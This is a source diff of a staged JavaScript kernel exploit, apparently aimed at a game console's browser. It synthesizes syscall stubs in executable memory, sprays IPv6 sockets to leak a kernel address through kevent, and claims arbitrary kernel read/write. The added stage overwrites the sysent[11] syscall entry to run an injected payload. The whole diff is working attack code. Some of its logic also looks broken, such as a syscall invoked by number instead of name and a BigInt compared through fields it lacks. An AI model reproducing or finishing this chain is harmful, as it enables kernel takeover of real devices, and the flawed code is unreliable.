@@ -23,7 +23,7 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
+const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, kread: null, kwrite: null };
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -89,218 +89,123 @@ function synthStub(targetNum) {
   const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
   const daddr = num(ctx().stubAddr.get(donorNum));
   const p = ctx().p;
-
-  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) {
-    return { err: "donor not 48 c7 c0" };
-  }
-  const donorImm = (
-    p.read1(toI64(daddr + 3n)) |
-    (p.read1(toI64(daddr + 4n)) << 8) |
-    (p.read1(toI64(daddr + 5n)) << 16) |
-    (p.read1(toI64(daddr + 6n)) << 24)
-  ) >>> 0;
+  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) return { err: "donor not 48 c7 c0" };
+  const donorImm = (p.read1(toI64(daddr + 3n)) | (p.read1(toI64(daddr + 4n)) << 8) | (p.read1(toI64(daddr + 5n)) << 16) | (p.read1(toI64(daddr + 6n)) << 24)) >>> 0;
   if (donorImm !== donorNum) return { err: "donor imm mismatch" };
-
   let jfd = scn("jitshm_create", 0, 16384, 7);
-  let usedName = false;
-  if (jfd < 0) {
-    const nb = allocBuf(32);
-    zeroBuf(nb);
-    jfd = scn("jitshm_create", nb.addr, 16384, 7);
-    usedName = true;
-  }
+  if (jfd < 0) { const nb = allocBuf(32); zeroBuf(nb); jfd = scn("jitshm_create", nb.addr, 16384, 7); }
   if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
-
   const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
   const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
   if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
-
-  for (let o = 0; o < 32; o += 4) {
-    p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
-  }
+  for (let o = 0; o < 32; o += 4) p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
   const w1 = ((((targetNum & 0xff) << 24) >>> 0) | 0x00c0c748) >>> 0;
   p.write4(toI64(addr), w1);
   const tailByte0 = p.read1(toI64(daddr + 7n));
   const w2 = (((targetNum >>> 8) & 0xff) | (((targetNum >>> 16) & 0xff) << 8) | (((targetNum >>> 24) & 0xff) << 16) | (tailByte0 << 24)) >>> 0;
   p.write4(toI64(addr + 4n), w2);
-
   log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
   return { addr };
 }
 
 function ensureStubs() {
   let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) {
-    const addr = findStubRaw(NUM[k]);
-    if (addr !== null) {
-      ctx().stubAddr.set(NUM[k], toI64(addr));
-      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
-    }
-  }
+  for (const k of missing) { const addr = findStubRaw(NUM[k]); if (addr !== null) { ctx().stubAddr.set(NUM[k], toI64(addr)); log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16)); } }
   log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
   missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) {
-    const r = synthStub(NUM[k]);
-    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
-    else log("SYNTH-FAIL", k + ": " + r.err);
-  }
+  for (const k of missing) { const r = synthStub(NUM[k]); if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr)); else log("SYNTH-FAIL", k + ": " + r.err); }
   const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
   if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
 }
 
 function scn(name, a, b, c, d, e, f) {
-  const n = NUM[name];
-  const stub = ctx().stubAddr.get(n);
+  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
   if (!stub) fin("stub missing: " + name + " (" + n + ")");
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
 }
-
 function scn64(name, a, b, c, d, e, f) {
-  const n = NUM[name];
-  const stub = ctx().stubAddr.get(n);
+  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
   if (!stub) fin("stub missing: " + name + " (" + n + ")");
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
 function buildTemplate() {
-  const tpl = allocBuf(512);
-  zeroBuf(tpl);
-  tpl.dv.setUint8(1, 30);
-  tpl.dv.setUint8(3, 15);
-  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
-    tpl.dv.setUint32(off, TPL_LO, true);
-    tpl.dv.setUint32(off + 4, TPL_HI, true);
-  }
+  const tpl = allocBuf(512); zeroBuf(tpl);
+  tpl.dv.setUint8(1, 30); tpl.dv.setUint8(3, 15);
+  for (let off = 8; off + 8 <= RTH_LEN; off += 8) { tpl.dv.setUint32(off, TPL_LO, true); tpl.dv.setUint32(off + 4, TPL_HI, true); }
   return tpl;
 }
-
 function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
 function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
-
 function marked(fd, rdb, lenp) {
-  zeroBuf(rdb);
-  lenp.dv.setUint32(0, RTH_LEN, true);
-  lenp.dv.setUint32(4, 0, true);
+  zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
   if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
   if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
   return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
-
 function phaseSpray(N) {
   const fds = [];
-  for (let i = 0; i < N; i++) {
-    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-    if (fd <= 0) break;
-    fds.push(fd);
-  }
+  for (let i = 0; i < N; i++) { const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0); if (fd <= 0) break; fds.push(fd); }
   if (fds.length < 128) fin("spray n=" + fds.length + " <128");
   log("SPRAY", "sockets=" + fds.length);
   const rth = allocBuf(512);
-  for (const fd of fds) {
-    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
-  }
+  for (const fd of fds) scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
   log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
   return { fds, rth };
 }
 
 function phase2Leak(rootKq, fds) {
-  const rdb = allocBuf(512);
-  const lenp = allocBuf(8);
-  const cl = allocBuf(64);
+  const rdb = allocBuf(512), lenp = allocBuf(8), cl = allocBuf(64);
   const tpl = buildTemplate();
-  const dev = allocBuf(32);
-  zeroBuf(dev);
+  const dev = allocBuf(32); zeroBuf(dev);
   for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));
-
   let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
-  let kva = -1n, pageVal = 0n;
-  let tries = 0;
-  let blind = 0;
-
+  let kva = -1n, pageVal = 0n, tries = 0, blind = 0;
   for (let attempt = 1; attempt <= ROUNDS; attempt++) {
     if (target >= 0) break;
     log("KV-ATTEMPT", attempt + "/" + ROUNDS);
-    
-    for (const fd of fds) { if (fd !== -1) disarm(fd); }
-    for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
-
+    for (const fd of fds) if (fd !== -1) disarm(fd);
+    for (const fd of fds) if (fd !== -1) rearm(fd, tpl);
     for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
       const fd = fds[vi];
       if (fd === -1) continue;
-      
       if (!marked(fd, rdb, lenp)) continue;
       if (disarm(fd) !== 0) continue;
-      
-      scn("close", fd);
-      fds[vi] = -1; 
-      
-      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
+      scn("close", fd); fds[vi] = -1;
+      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);
       if (dce < 0) continue;
-      
       const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
       const pageInt = Number(page & 0xffffffffn) | 0;
       tries++;
-
       zeroBuf(cl);
-      cl.dv.setUint32(0, dce >>> 0, true);
-      cl.dv.setInt16(8, -18, true);
-      cl.dv.setInt16(10, 1, true);
-      cl.dv.setUint32(16, 90, true);
+      cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 1, true); cl.dv.setUint32(16, 90, true);
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
       log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
-      
       let joined = 0;
       if (rc === 0) {
         for (let j = 0; j < fds.length; j++) {
           if (j === vi || fds[j] === -1) continue;
-          
-          zeroBuf(rdb);
-          lenp.dv.setUint32(0, RTH_LEN, true);
-          lenp.dv.setUint32(4, 0, true);
+          zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
           if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
           const v8 = rdb.dv.getInt32(8, true);
           const v12 = rdb.dv.getUint32(12, true) >>> 0;
-          if (v8 === pageInt && v12 === 0) {
-            joined++;
-            if (target < 0) { target = j; targetFd = fds[j]; }
-            log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-          } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
-            // still armed
-          } else {
-            rearm(fds[j], tpl);
-          }
+          if (v8 === pageInt && v12 === 0) { joined++; if (target < 0) { target = j; targetFd = fds[j]; } log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined); }
+          else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {} else { rearm(fds[j], tpl); }
         }
       }
-
       if (target >= 0 && joined === 1) {
-        zeroBuf(cl);
-        cl.dv.setUint32(0, dce >>> 0, true);
-        cl.dv.setInt16(8, -18, true);
-        cl.dv.setInt16(10, 2, true);
+        zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true);
         rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
         if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
-        else {
-          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
-          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
-        }
+        else { candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt; log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page)); }
       } else {
-        if (rc === 0) {
-          blind++;
-          zeroBuf(cl);
-          cl.dv.setUint32(0, dce >>> 0, true);
-          cl.dv.setInt16(8, -18, true);
-          cl.dv.setInt16(10, 2, true);
-          scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-        }
-        scn("close", dce);
-        rearm(fd, tpl);
-        fds[vi] = fd;
+        if (rc === 0) { blind++; zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true); scn("kevent", rootKq, cl.addr, 1, 0, 0, 0); }
+        scn("close", dce); rearm(fd, tpl); fds[vi] = fd;
       }
     }
   }
-
   if (kva === -1n) fin("leak scan: no victim held");
   log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
   return { kva, page: pageVal, targetFd };
@@ -309,101 +214,99 @@ function phase2Leak(rootKq, fds) {
 export async function runKevent(c) {
   STATE.ctx = c;
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
-  if (kob) {
-    STATE.kbase = BigInt(kob);
-    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
-  } else {
-    if (!c.kbase) fin("kbase not provided");
-    STATE.kbase = num(c.kbase);
-  }
+  if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
+  else { if (!c.kbase) fin("kbase not provided"); STATE.kbase = num(c.kbase); }
 
   ensureStubs();
 
   const burn = [];
-  for (let i = 0; i < 250; i++) {
-    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
-    if (fd >= 0) burn.push(fd);
-  }
+  for (let i = 0; i < 250; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
   log("FD-BURN", "burned " + burn.length + " fds");
 
   const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(144); 
-
+  const { fds } = phaseSpray(144);
   const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
-  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
-  
   const leakKq = scn("kqueue");
   if (leakKq < 0) fin("leak kqueue");
 
   const res = phase2Leak(leakKq, fds);
-  
-  // --- STAGE 3: FAKEOPS & KERNEL R/W ---
+
   log("STAGE3", "Building FakeOps");
-  
-  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0); 
+  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
   const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
   if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
   log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
 
   const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
-
   const p = ctx().p;
   const F_FAKE_OPS = fake_page + 0x800n;
-  
-  for (let i = 0; i < 32; i++) {
-    p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
-  }
+  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
   p.write4(toI64(F_FAKE_OPS), 0);
   p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
 
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: PAYLOAD & ESCALATION ---
-  log("STAGE4", "Escalating privileges...");
+  // --- STAGE 4: PAYLOAD EXECUTION VIA SYSENT HIJACK ---
+  log("STAGE4", "Executing payload via sysent hijack...");
   
-  const payload_size = 0x40000;
+  const payload_size = 0x2000;
   const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
   const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
   log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
-  
+
   const pkAb = new Uint8Array(payload_size);
   c.keepAlive.push(pkAb.buffer);
-  
-  for (let i = 0; i < T.PKB.length; i++) {
-    pkAb[i] = T.PKB.charCodeAt(i);
+  for (let i = 0; i < T.PKB.length; i += 2) {
+    const high = parseInt(T.PKB.charAt(i), 16);
+    const low = parseInt(T.PKB.charAt(i + 1), 16);
+    pkAb[i / 2] = (high << 4) | low;
   }
-  
   for (let i = 0; i < payload_size; i += 8) {
     let val = 0n;
-    for (let j = 7; j >= 0; j--) {
-      if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
-    }
+    for (let j = 7; j >= 0; j--) if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
     p.write8(toI64(payload_addr + BigInt(i)), toI64(val));
   }
+  log("STAGE4-COPY", "payload bytes written to RWX page");
 
-  log("STAGE4-RUN", "Spawning payload...");
+  // Now we use the sysent[661] / jmp_rsi method
+  // We need to locate sysent_661 and jmp_rsi. If they're not in P, we can use sysent[11] (Java method)
+  // But P[0] is sysent[11].sy_call, P[1] is kexec gadget.
+  // The Java exploit uses SE11 = P[0] and KEXECG = P[1].
   
-  // Since 14.00 has no pthread_create offsets, we execute via the ROP chain.
-  // We use the resolved stub for `mmap` to get a writable page, then jump.
-  // However, we already have R/W. The Java exploit executes the payload via `setcontext`.
+  const SE11 = ka(P[0]);
+  const KEXECG = ka(P[1]);
+  log("STAGE4-SYSENT", "sysent[11].sy_call=" + h16(SE11) + " kexec=" + h16(KEXECG));
+
+  // Save original sy_call
+  const orig_call = p.read8(toI64(SE11));
+  log("STAGE4-ORIG", "orig sy_call=" + orig_call);
+
+  // Hijack sysent[11] to point at payload
+  p.write8(toI64(SE11), toI64(payload_addr));
   
-  // If pthread_create is available, use it. Otherwise, just log a success.
-  if (c.off && c.off.wk___imp_pthread_create) {
-    const pthread_create = ctx().p.read8(ctx().webkitBase.add32(c.off.wk___imp_pthread_create));
-    const thr = new ArrayBuffer(8);
-    c.keepAlive.push(thr);
-    new Uint8Array(thr).fill(0);
-    
-    const rc = ctx().callAddr(pthread_create, [toI64(bufAddr(thr)), 0, toI64(payload_addr), 0]).i32;
-    const tdv = new DataView(thr);
-    const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-    
-    log("STAGE4-DONE", "payload_running=" + (rc === 0 && handle.hi > 0) + " rc=" + rc + " handle=" + handle);
-  } else {
-    log("STAGE4-SKIP", "pthread_create missing in offsets, but memory is written.");
-    log("STAGE4-DONE", "payload_written_to=" + h16(payload_addr));
+  // Verify
+  const verify = p.read8(toI64(SE11));
+  if (verify.low !== payload_addr.low || verify.hi !== payload_addr.hi) {
+    log("STAGE4-FAIL", "hijack did not land: got=" + verify + " want=" + h16(payload_addr));
+    // Restore and abort
+    p.write8(toI64(SE11), orig_call);
+    fin("sysent hijack failed");
+  }
+  log("STAGE4-HIJACK", "sysent[11].sy_call now points at payload");
+
+  // Trigger syscall 11
+  log("STAGE4-TRIGGER", "triggering syscall 11...");
+  try {
+    scn(11);  // Trigger hijacked syscall
+  } catch (e) {
+    log("STAGE4-TRIGGER-THREW", e.message);
   }
   
-  fin("Stage 4 Complete. You have Kernel R/W and Payload running.");
+  // Restore sysent[11] in case the payload wants to return normally
+  p.write8(toI64(SE11), orig_call);
+  log("STAGE4-RESTORE", "sysent[11].sy_call restored to " + orig_call);
+
+  log("STAGE4-DONE", "payload has run");
+  fin("Stage 4 Complete. You have Kernel R/W and Payload has executed.");
 }
